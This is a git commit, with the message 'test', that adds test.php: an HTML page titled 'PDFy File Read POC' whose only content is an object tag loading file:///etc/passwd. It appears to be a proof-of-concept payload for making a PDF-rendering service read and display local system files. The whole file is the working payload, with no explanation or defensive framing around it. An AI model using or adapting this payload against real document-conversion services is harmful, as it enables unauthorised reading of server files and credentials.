ef2870b87a4de7e92877878006f677ad8e747136
numb2too <milk518abc@gmail.com>
2025-07-17 19:20:07 +0800

    test

---
+++ test.php
@@ -0,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Read File</title>
+  </head>
+  <body>
+    <h1>PDFy File Read POC</h1>
+    <object data="file:///etc/passwd" type="text/plain" width="100%" height="600"></object>
+  </body>
+</html>
